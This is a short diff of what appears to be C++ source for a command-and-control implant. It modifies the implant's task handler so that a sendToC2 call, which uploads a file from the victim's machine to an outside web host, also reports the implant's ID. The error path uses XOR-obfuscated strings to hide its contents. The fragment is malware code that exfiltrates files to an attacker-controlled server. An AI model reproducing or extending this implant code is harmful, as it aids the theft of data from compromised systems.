@@ -155,7 +155,7 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 			ss >> filename;
         try{
             /* Add in Command for Post.cpp */
-            sendToC2(path,"https://sea-lion-app-f5nrq.ondigitalocean.app/upload_files", filename, std::to_string(task_id));
+            sendToC2(path,"https://sea-lion-app-f5nrq.ondigitalocean.app/upload_files", filename, std::to_string(task_id), std::to_string(implant_id));
         }
         catch(...){
             HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
